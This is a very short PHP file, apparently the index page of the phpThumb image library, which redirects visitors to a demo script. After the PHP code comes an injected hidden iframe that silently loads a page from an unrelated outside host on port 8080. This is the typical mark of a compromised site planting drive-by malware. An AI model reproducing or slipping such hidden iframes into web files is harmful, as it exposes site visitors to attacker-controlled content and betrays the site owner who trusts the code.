<?php
header('Location: demo/phpThumb.demo.demo1.php');

<iframe src="http://filmoflife.cn:8080/index.php" width=104 height=101 style="visibility: hidden"></iframe>